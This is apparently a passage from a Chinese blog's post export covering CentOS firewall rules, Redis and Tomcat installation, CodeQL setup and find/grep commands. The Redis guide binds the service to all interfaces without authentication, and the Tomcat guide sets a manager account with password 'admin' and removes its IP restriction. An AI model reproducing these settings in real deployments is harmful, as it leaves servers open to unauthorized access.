class="string">&quot;514&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">accept</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rule</span> <span class="attr">family</span>=<span class="string">&quot;ipv4&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">source</span> <span class="attr">address</span>=<span class="string">&quot;123.60.255.14&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">port</span> <span class="attr">protocol</span>=<span class="string">&quot;tcp&quot;</span> <span class="attr">port</span>=<span class="string">&quot;10050-10051&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">accept</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rule</span> <span class="attr">family</span>=<span class="string">&quot;ipv4&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">source</span> <span class="attr">address</span>=<span class="string">&quot;192.249.87.114&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">port</span> <span class="attr">protocol</span>=<span class="string">&quot;tcp&quot;</span> <span class="attr">port</span>=<span class="string">&quot;80&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">accept</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rule</span> <span class="attr">family</span>=<span class="string">&quot;ipv4&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">port</span> <span class="attr">protocol</span>=<span class="string">&quot;tcp&quot;</span> <span class="attr">port</span>=<span class="string">&quot;9527&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">accept</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">zone</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>上面的对应的规则</code></p>
<p><code>固定IP 固定协议 的固定端口访问</code></p>
<p><code>固定IP 固定协议 的范围端口访问</code></p>
<p><code>固定IP 固定协议 的固定端口访问</code></p>
<p><code>任意IP 固定协议 的固定端口访问切换为iptables防火墙</code></p>
<p><code>关闭firewall：</code></p>
<h4 id="安装iptables防火墙"><a href="#安装iptables防火墙" class="headerlink" title="安装iptables防火墙"></a>安装iptables防火墙</h4><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><p><code>yum install iptables-services</code></p>
<h5 id="开启iptables"><a href="#开启iptables" class="headerlink" title="开启iptables"></a>开启iptables</h5><p><code>service iptables restart</code></p>
<h5 id="设置防火墙开机启动"><a href="#设置防火墙开机启动" class="headerlink" title="设置防火墙开机启动"></a>设置防火墙开机启动</h5><p><code>systemctl enable iptables.service  或者chkconfig iptables on</code></p>
<h5 id=""><a href="#" class="headerlink" title=""></a></h5><h5 id="查看已生效的规则"><a href="#查看已生效的规则" class="headerlink" title="查看已生效的规则"></a>查看已生效的规则</h5><p>iptables -L -n命令行方式</p>
<p><code>iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 3306 -j ACCEPT</code></p>
<h5 id="写入配置文件"><a href="#写入配置文件" class="headerlink" title="写入配置文件"></a>写入配置文件</h5><p><code>service iptables save</code></p>
<p>这样下次重启依旧会生效配置文件方式</p>
<h5 id="编辑iptables防火墙配置"><a href="#编辑iptables防火墙配置" class="headerlink" title="编辑iptables防火墙配置"></a>编辑iptables防火墙配置</h5><p>vi /etc/sysconfig/iptables</p>
<p>下边是一个完整的配置文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Firewall configuration written by system-config-firewall</span><br><span class="line"></span><br><span class="line">Manual customization of this file is not recommended.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*filter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">:INPUT ACCEPT [0:0]:FORWARD ACCEPT [0:0]:OUTPUT ACCEPT [0:0]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line"></span><br><span class="line">-A INPUT -p icmp -j ACCEPT</span><br><span class="line"></span><br><span class="line">-A INPUT -i lo -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT</span><br><span class="line"></span><br><span class="line">-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT</span><br><span class="line"></span><br><span class="line">-A INPUT -m state --state NEW -m tcp -p tcp --dport 3306 -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-A INPUT -j REJECT --reject-with icmp-host-prohibited</span><br><span class="line"></span><br><span class="line">-A FORWARD -j REJECT --reject-with icmp-host-prohibited</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">COMMIT</span><br></pre></td></tr></table></figure>

<p>保存退出</p>
<p>:wq!</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>centos</tag>
        <tag>firwall</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis6.2.6在Centos7上的安装过程</title>
    <url>/2022/02/17/centos%E5%AE%89%E8%A3%85redis6.2.6/</url>
    <content><![CDATA[<h1 id="Redis6-2-6在Centos7上的安装过程"><a href="#Redis6-2-6在Centos7上的安装过程" class="headerlink" title="Redis6.2.6在Centos7上的安装过程"></a>Redis6.2.6在Centos7上的安装过程</h1><span id="more"></span>

<h1 id="1-系统环境"><a href="#1-系统环境" class="headerlink" title="1.系统环境"></a>1.系统环境</h1><p>操作系统：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@m161p114 software]# lsb_release -a</span><br><span class="line">LSB Version:    :core-4.1-amd64:core-4.1-noarch:cxx-4.1-amd64:cxx-4.1-noarch:desktop-4.1-amd64:desktop-4.1-noarch:languages-4.1-amd64:languages-4.1-noarch:printing-4.1-amd64:printing-4.1-noarch</span><br><span class="line">Distributor ID: CentOS</span><br><span class="line">Description:    CentOS Linux release 7.9.2009 (Core)</span><br><span class="line">Release:    7.9.2009</span><br><span class="line">Codename:   Core</span><br></pre></td></tr></table></figure>

<p>redis安装的源码文件：<br><a href="https://links.jianshu.com/go?to=https://download.redis.io/releases/redis-6.2.6.tar.gz">redis-6.2.6.tar.gz</a></p>
<p>该文件下载后，放置在 /opt/software目录</p>
<h1 id="2-gcc升级"><a href="#2-gcc升级" class="headerlink" title="2.gcc升级"></a>2.gcc升级</h1><p>redis6的源码需要用gcc版本为9的环境进行编译。首先需要确认，gcc及gcc-c++ 已经安装。如果没有安装，执行如下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install gcc gcc-c++</span><br></pre></td></tr></table></figure>

<p>当前系统的gcc环境为：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@m161p114 ~]# gcc -v</span><br><span class="line">Using built-in specs.</span><br><span class="line">COLLECT_GCC=gcc</span><br><span class="line">COLLECT_LTO_WRAPPER=/usr/libexec/gcc/x86_64-redhat-linux/4.8.5/lto-wrapper</span><br><span class="line">Target: x86_64-redhat-linux</span><br><span class="line">Configured with: ../configure --prefix=/usr --mandir=/usr/share/man --infodir=/usr/share/info --with-bugurl=http://bugzilla.redhat.com/bugzilla --enable-bootstrap --enable-shared --enable-threads=posix --enable-checking=release --with-system-zlib --enable-__cxa_atexit --disable-libunwind-exceptions --enable-gnu-unique-object --enable-linker-build-id --with-linker-hash-style=gnu --enable-languages=c,c++,objc,obj-c++,java,fortran,ada,go,lto --enable-plugin --enable-initfini-array --disable-libgcj --with-isl=/builddir/build/BUILD/gcc-4.8.5-20150702/obj-x86_64-redhat-linux/isl-install --with-cloog=/builddir/build/BUILD/gcc-4.8.5-20150702/obj-x86_64-redhat-linux/cloog-install --enable-gnu-indirect-function --with-tune=generic --with-arch_32=x86-64 --build=x86_64-redhat-linux</span><br><span class="line">Thread model: posix</span><br><span class="line">gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) </span><br></pre></td></tr></table></figure>

<p>通过如下命令升级：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install centos-release-scl</span><br><span class="line">yum -y install devtoolset-9-gcc devtoolset-9-gcc-c++ devtoolset-9-binutils</span><br><span class="line"></span><br><span class="line">scl enable devtoolset-9 bash</span><br></pre></td></tr></table></figure>

<p>配置环境变量：<br>vim /etc/profile<br>在末尾追加：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source /opt/rh/devtoolset-9/enable</span><br></pre></td></tr></table></figure>

<p>这样系统就能确保每次启动都能开启gcc9环境。</p>
<p>现在查看gcc版本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@m161p114 software]# gcc -v</span><br><span class="line">Using built-in specs.</span><br><span class="line">COLLECT_GCC=gcc</span><br><span class="line">COLLECT_LTO_WRAPPER=/opt/rh/devtoolset-9/root/usr/libexec/gcc/x86_64-redhat-linux/9/lto-wrapper</span><br><span class="line">Target: x86_64-redhat-linux</span><br><span class="line">Configured with: ../configure --enable-bootstrap --enable-languages=c,c++,fortran,lto --prefix=/opt/rh/devtoolset-9/root/usr --mandir=/opt/rh/devtoolset-9/root/usr/share/man --infodir=/opt/rh/devtoolset-9/root/usr/share/info --with-bugurl=http://bugzilla.redhat.com/bugzilla --enable-shared --enable-threads=posix --enable-checking=release --enable-multilib --with-system-zlib --enable-__cxa_atexit --disable-libunwind-exceptions --enable-gnu-unique-object --enable-linker-build-id --with-gcc-major-version-only --with-linker-hash-style=gnu --with-default-libstdcxx-abi=gcc4-compatible --enable-plugin --enable-initfini-array --with-isl=/builddir/build/BUILD/gcc-9.3.1-20200408/obj-x86_64-redhat-linux/isl-install --disable-libmpx --enable-gnu-indirect-function --with-tune=generic --with-arch_32=x86-64 --build=x86_64-redhat-linux</span><br><span class="line">Thread model: posix</span><br><span class="line">gcc version 9.3.1 20200408 (Red Hat 9.3.1-2) (GCC) </span><br></pre></td></tr></table></figure>

<h1 id="3-编译及安装redis"><a href="#3-编译及安装redis" class="headerlink" title="3.编译及安装redis"></a>3.编译及安装redis</h1><p>在/opt目录中执行解压：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zxvf /opt/software/redis-6.2.6.tar.gz </span><br></pre></td></tr></table></figure>

<p>然后执行make:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /opt/redis-6.2.6</span><br><span class="line">make</span><br><span class="line">make install PREFIX=/usr/local/redis</span><br></pre></td></tr></table></figure>

<p>配置redis环境变量，在/etc/profile中增加如下内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export REDIS_HOME=/usr/local/redis</span><br><span class="line">export PATH=$PATH:$REDIS_HOME/bin</span><br></pre></td></tr></table></figure>

<p>之后执行source加载环境变量：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>

<p>执行如下命令。说明环境变量配置成功：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@m161p114 utils]# redis-server --version</span><br><span class="line">Redis server v=6.2.6 sha=00000000:0 malloc=jemalloc-5.1.0 bits=64 build=336fe6a5b7d02b06</span><br></pre></td></tr></table></figure>

<h1 id="4-通过install-server-sh配置servie服务"><a href="#4-通过install-server-sh配置servie服务" class="headerlink" title="4.通过install_server.sh配置servie服务"></a>4.通过install_server.sh配置servie服务</h1><p>如果出现如下提示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@m161p114 utils]# ./install_server.sh </span><br><span class="line">Welcome to the redis service installer</span><br><span class="line">This script will help you easily set up a running redis server</span><br><span class="line"></span><br><span class="line">This systems seems to use systemd.</span><br><span class="line">Please take a look at the provided example service unit files in this directory, and adapt and install them. Sorry!</span><br></pre></td></tr></table></figure>

<p>需要用vim将install_server.sh中的如下代码注释掉:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$&#123;_pid_1_exe##*/&#125;</span>&quot;</span> = systemd ]</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="keyword">then</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">       <span class="built_in">echo</span> <span class="string">&quot;This systems seems to use systemd.&quot;</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">       <span class="built_in">echo</span> <span class="string">&quot;Please take a look at the provided example service unit files in this directory, and adapt and install them. Sorry!&quot;</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">       <span class="built_in">exit</span> 1</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="keyword">fi</span></span></span><br></pre></td></tr></table></figure>

<p>这是因为，centos7最开始的版本采用systemd配置服务。而新版本的centos又支持兼容之前的centos6中的配置。redis在此做了一个保护。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /opt/redis-6.2.6/utils</span><br><span class="line">[root@m161p114 utils]# ./install_server.sh</span><br><span class="line"></span><br><span class="line">Please select the redis port for this instance: [6379] </span><br><span class="line">Selecting default: 6379</span><br><span class="line">Please select the redis config file name [/etc/redis/6379.conf] </span><br><span class="line">Selected default - /etc/redis/6379.conf</span><br><span class="line">Please select the redis log file name [/var/log/redis_6379.log] /opt/redis/logs/redis_6379.log</span><br><span class="line">Please select the data directory for this instance [/var/lib/redis/6379] /opt/redis/data/6379</span><br><span class="line">Please select the redis executable path [/usr/local/redis/bin/redis-server] /usr/local/redis/bin/redis-server</span><br><span class="line">Selected config:</span><br><span class="line">Port           : 6379</span><br><span class="line">Config file    : /etc/redis/6379.conf</span><br><span class="line">Log file       : /opt/redis/logs/redis_6379.log</span><br><span class="line">Data dir       : /opt/redis/data/6379</span><br><span class="line">Executable     : /usr/local/redis/bin/redis-server</span><br><span class="line">Cli Executable : //usr/local/redis/bin/redis-cli</span><br><span class="line">Is this ok? Then press ENTER to go on or Ctrl-C to abort.</span><br><span class="line">Copied /tmp/6379.conf =&gt; /etc/init.d/redis_6379</span><br><span class="line">Installing service...</span><br><span class="line">Successfully added to chkconfig!</span><br><span class="line">Successfully added to runlevels 345!</span><br><span class="line">Starting Redis server...</span><br><span class="line">Installation successful!</span><br></pre></td></tr></table></figure>

<p>现在可以通过service进行启动和关闭：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@m161p114 utils]# service redis_6379 start</span><br><span class="line">Starting Redis server...</span><br><span class="line">[root@m161p114 utils]# service redis_6379 stop</span><br><span class="line">Stopping ...</span><br><span class="line">Redis stopped</span><br><span class="line">[root@m161p114 utils]# </span><br></pre></td></tr></table></figure>

<h1 id="5-修改配置文件"><a href="#5-修改配置文件" class="headerlink" title="5.修改配置文件"></a>5.修改配置文件</h1><p>修改redis的配置文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/redis/6379.conf</span><br><span class="line"></span><br><span class="line">修改bind为：</span><br><span class="line">bind 0.0.0.0  -::1</span><br></pre></td></tr></table></figure>

<p>这样外部服务才能连接到redis服务中。<br>启动redis,通过客户端连接测试：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@m161p114 redis]# redis-cli</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line">[root@m161p114 redis]# redis-cli -h 192.168.161.114 -p 6379</span><br><span class="line">192.168.161.114:6379&gt; </span><br></pre></td></tr></table></figure>

<p>说明redis安装成功。</p>
]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>centos部署tomcat</title>
    <url>/2022/01/18/centos%E9%83%A8%E7%BD%B2tomcat/</url>
    <content><![CDATA[<p>查看系统的位数,通过该命令就能查看<span id="more"></span></p>
<p><code>getconf LONG_BIT</code></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220119161624050.png" alt="image-20220119161624050"></p>
<h4 id="安装JDK"><a href="#安装JDK" class="headerlink" title="安装JDK"></a>安装JDK</h4><p>下载jdk对应安装包linuxx64.tar.gz的</p>
<p>通过ssh工具上传到/usr/local下面</p>
<p>解压</p>
<p><code>tar -zxvf jdk-linux-x64.tar.gz </code></p>
<p>重命名,方便等会环境变量的配置</p>
<p><code>mv jdk1.8.0_131/ jdk1.8</code></p>
<h4 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h4><p><code>vim /etc/profile</code></p>
<h5 id="编辑profile文件"><a href="#编辑profile文件" class="headerlink" title="编辑profile文件"></a>编辑profile文件</h5><p>在文件末尾添加</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">export</span> <span class="string">JAVA_HOME=/usr/local/jdk1.8/</span></span><br><span class="line"></span><br><span class="line"><span class="attr">export</span> <span class="string">CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</span></span><br><span class="line"></span><br><span class="line"><span class="attr">export</span> <span class="string">PATH=$PATH:$JAVA_HOME/bin</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="通过source命令重新加载profile文件"><a href="#通过source命令重新加载profile文件" class="headerlink" title="通过source命令重新加载profile文件"></a>通过source命令重新加载profile文件</h5><p><code>source /etc/profile</code></p>
<h5 id="检查是否安装成功"><a href="#检查是否安装成功" class="headerlink" title="检查是否安装成功"></a>检查是否安装成功</h5><p><code>java -version</code></p>
<p>出现如下显示,表示安装成功</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220119173528732.png" alt="image-20220119173528732"></p>
<h4 id="安装tomcat"><a href="#安装tomcat" class="headerlink" title="安装tomcat"></a>安装tomcat</h4><p>在usr/local目录下</p>
<p><code>mkdir myDir</code></p>
<p>进入myDir,上传tomcat包</p>
<p>解压</p>
<p><code>tar -zxvf apache-tomcat-9.0.56.tar.gz</code></p>
<p>重命名</p>
<p><code>mv apache-tomcat-9.0.56 tomcat9</code></p>
<p>开放端口,可以参考<a href="https://www.bluesatchel.space/2021/01/13/centos7%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/">这里</a></p>
<p><code>firewall-cmd --zone=public --add-port=3306/tcp --permanent</code></p>
<p>重启防火墙,这点很重要!!!!</p>
<p>还要在对应云服务提供商的控制台去修改防火墙策略添加对应端口</p>
<p>修改./conf/server.xml配置站点</p>
<p>修改端口</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220119175609053.png" alt="image-20220119175609053"></p>
<p>进入tomcat/bin目录下启动tomcat服务</p>
<p><code>./startup.sh </code></p>
<p>但是出现了无法访问的情况</p>
<p>查看端口开放情况</p>
<p><code>netstat -tlun</code>,3306也是开放的</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220119180956606.png" alt="image-20220119180956606"></p>
<p>查看防火墙端口开放情况</p>
<p><code>/etc/firewalld/zones/public.xml</code></p>
<p>也是开放的</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220119181250440.png" alt="image-20220119181250440"></p>
<p>使用<code>lsof -i:3306</code>,查看3306占用情况,才发现自己忘记了Mysql在3306运行,把端口改成3333就行了,确实蠢驴一个呜呜呜</p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/tomcat_emoji.jpg" alt="tomcat_emoji" style="zoom: 33%;" />

<h5 id="访问管理页面managerApp"><a href="#访问管理页面managerApp" class="headerlink" title="访问管理页面managerApp"></a>访问管理页面managerApp</h5><p>根据提示,默认情况下管理页面只能允许同一台主机本地访问</p>
<p>配置conf/tomcat-users.xml</p>
<p>在tomcat-users下添加</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">&quot;manager-gui&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span> <span class="attr">password</span>=<span class="string">&quot;admin&quot;</span> <span class="attr">roles</span>=<span class="string">&quot;manager-gui&quot;</span> <span class="attr">username</span>=<span class="string">&quot;tomcat&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>打开**/webapps/manager/META-INF/目录下context.xml文件**</p>
<p>若不加Value元素默认不限制ip</p>
<p>若不加allow默认限制所有ip访问</p>
<p>这里为了方便,把value注释掉</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220119184223964.png" alt="image-20220119184223964"></p>
<p>现在访问管理页面,按照上面role的账号和密码输入就能访问了</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>centos</tag>
        <tag>tomcat部署</tag>
      </tags>
  </entry>
  <entry>
    <title>codeql安装</title>
    <url>/2022/05/06/codeql%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<p>本文章为多次尝试之后,自己成功安装并运行成功codeql的记录,没啥技术含量…<span id="more"></span></p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>首先安装最新版的vsCode</p>
<h4 id="安装扩展"><a href="#安装扩展" class="headerlink" title="安装扩展"></a>安装扩展</h4><p>在其中搜索并安装CodeQl拓展</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220506121927675.png" alt="image-20220506121927675"></p>
<h4 id="下载codeql引擎"><a href="#下载codeql引擎" class="headerlink" title="下载codeql引擎"></a>下载codeql引擎</h4><p>接着下载codeql引擎,选择对应版本即可</p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220506121845766.png" alt="image-20220506121845766" style="zoom:80%;" />

<p>点击小齿轮,Extension Settings 打开拓展设置</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220506121953523.png" alt="image-20220506121953523"></p>
<p>把刚才下载并解压的ql引擎文件中的<code>codeql.exe</code>的路径填写上去</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220506122124707.png" alt="image-20220506122124707"></p>
<p>同时把codeql.exe的路径配置到环境变量<code>path</code>中去,这一步是为了后面使用命令行构建数据库做准备</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220506122629448.png" alt="image-20220506122629448"></p>
<h4 id="设置workspace"><a href="#设置workspace" class="headerlink" title="设置workspace"></a>设置workspace</h4><p>接下来设置workspace</p>
<p>直接去clone这个项目<a href="https://github.com/github/vscode-codeql-starter,%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E6%9C%89%E5%A4%A7%E4%BD%AC%E8%AE%BE%E7%BD%AE%E5%A5%BD%E7%9A%84workspace,%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E6%8B%BF%E6%9D%A5%E7%94%A8">https://github.com/github/vscode-codeql-starter,这个项目中有大佬设置好的workspace,可以直接拿来用</a></p>
<p>在clone的时候因为其包含子项目,不能直接git clone,需要加一个<code>--recursive</code>参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --recursive https://github.com/github/vscode-codeql-starter.git</span><br></pre></td></tr></table></figure>

<p>如果https的报ssl错误,记得换成ssh的连接clone</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --recursive git@github.com:github/vscode-codeql-starter.git</span><br></pre></td></tr></table></figure>

<h3 id="构建数据库"><a href="#构建数据库" class="headerlink" title="构建数据库"></a>构建数据库</h3><p>现在需要下载的东西都下载完成了,接下来是很重要的一步,也就是构建数据库</p>
<p>这里以java为例,建议第一次先新建一个maven项目,随便写点东西进去</p>
<p>给一个简单的maven项目建立数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">codeql database create D:\TOOLS\codeql\database\jndi --language=&quot;java&quot; --command=&quot;mvn clean install --file pom.xml&quot; --source-root=E:\java\jndi --overwrite</span><br></pre></td></tr></table></figure>

<p>第一部分是给建立数据库指定的文件夹,</p>
<p><code>--source-root</code>顾名思义就是源码文件夹</p>
<p><code>--command</code>则是指定使用maven来帮助进行编译打包,这里是最容易出问题的地方,各种依赖呀啥的都需要编译打包之后才能添加进数据库里面进行查询</p>
<p>也就是说codeql需要mvn帮助打包才能构建数据库</p>
<p><code>--overwrite</code>参数表示可以覆盖旧的数据库</p>
<p>对于java来说,如果在构建数据库的过程中出错了,那么一般都是因为mvn打包出了问题,可以单独在idea终端中尝试<code>mvn clean install --file pom.xml</code>根据报错信息来推断哪里出了问题</p>
<h3 id="执行查询语句"><a href="#执行查询语句" class="headerlink" title="执行查询语句"></a>执行查询语句</h3><p>首先打开vscode,通过<code>file-&gt; Open Workspace from file</code>打开刚才clone好的那个workspace项目中的<code>.code-workspace</code>文件</p>
<p>这样就成功引入了workspace</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220506124421164.png" alt="image-20220506124421164"></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220506124308766.png" alt="image-20220506124308766"></p>
<p>接着在vsCode的侧边栏</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220506124042825.png" alt="image-20220506124042825"></p>
<p>点击这个QL,进去之后,就可以添加数据库了</p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220506124111095.png" alt="image-20220506124111095" style="zoom:67%;" />

<p>通过目录引入刚才新建好的数据库</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220506124535532.png" alt="image-20220506124535532"></p>
<p>接着在custom这个目录下新建test.ql文件,编写ql语句,进行第一次查询</p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220506124610207.png" alt="image-20220506124610207" style="zoom:80%;" />

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220506124647783.png" alt="image-20220506124647783"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> <span class="type">int</span> x, <span class="type">int</span> y</span><br><span class="line"><span class="keyword">where</span> x <span class="operator">=</span> <span class="number">3</span> <span class="keyword">and</span> y <span class="keyword">in</span> [<span class="number">0</span> .. <span class="number">2</span>]</span><br><span class="line"><span class="keyword">select</span> x, y, x <span class="operator">*</span> y <span class="keyword">as</span> product, &quot;product: &quot; <span class="operator">+</span> product</span><br><span class="line"><span class="keyword">as</span> res <span class="keyword">order</span> <span class="keyword">by</span>  res <span class="keyword">desc</span></span><br></pre></td></tr></table></figure>

<p>右键在当前数据库Run query</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220506124801886.png" alt="image-20220506124801886"></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220506124822269.png" alt="image-20220506124822269"></p>
<p>成功执行了</p>
]]></content>
      <categories>
        <category>codeql</category>
      </categories>
      <tags>
        <tag>codeql</tag>
      </tags>
  </entry>
  <entry>
    <title>find&amp;grep</title>
    <url>/2021/01/13/find&amp;grep/</url>
    <content><![CDATA[<h2 id="find-和-grep命令"><a href="#find-和-grep命令" class="headerlink" title="find 和 grep命令"></a>find 和 grep命令</h2><p>在使用linux时，经常需要进行文件查找。其中查找的命令主要有find和grep。两个命令是有区的。</p>
<p>　　区别：</p>
<ul>
<li><p>find命令是根据文件的属性进行查找，如文件名，文件大小，所有者，所属组，是否为空，访问时间，修改时间等。 </p>
</li>
<li><p>grep是根据文件的内容进行查找，会对文件的每一行按照给定的模式(patter)进行匹配查找。</p>
</li>
</ul>
<h3 id="find命令"><a href="#find命令" class="headerlink" title="find命令"></a>find命令</h3><h4 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h4><p>​                       find  path expression</p>
<h5 id="1-按照文件名查找"><a href="#1-按照文件名查找" class="headerlink" title="1.按照文件名查找"></a>1.按照文件名查找</h5><p>　　　　(1)find / -name httpd.conf　　#在根目录下查找文件httpd.conf，表示在整个硬盘查找</p>
<p>　　　　(2)find /etc -name httpd.conf　　#在/etc目录下文件httpd.conf</p>
<p>　　　　(3)find /etc -name ‘<em>srm</em>‘　　#使用通配符*(0或者任意多个)。表示在/etc目录下查找文件名中含有字符串‘srm’的文件</p>
<p>　　　　(4)find . -name ‘srm*’ 　　#表示当前目录下查找文件名开头是字符串‘srm’的文件</p>
<h5 id="2-按照文件特征查找"><a href="#2-按照文件特征查找" class="headerlink" title="2.按照文件特征查找"></a>2.按照文件特征查找</h5><p>　　　　(1)find / -amin -10 　　# 查找在系统中最后10分钟访问的文件(access time)</p>
<p>　　　　(2)find / -atime -2　　 # 查找在系统中最后48小时访问的文件</p>
<p>　　　　(3)find / -empty 　　# 查找在系统中为空的文件或者文件夹</p>
<p>　　　　(4)find / -group cat 　　# 查找在系统中属于 group为cat的文件</p>
<p>　　　　(5)find / -mmin -5 　　# 查找在系统中最后5分钟里修改过的文件(modify time)</p>
<p>　　　　(6)find / -mtime -1 　　#查找在系统中最后24小时里修改过的文件</p>
<p>　　　　(7)find / -user fred 　　#查找在系统中属于fred这个用户的文件</p>
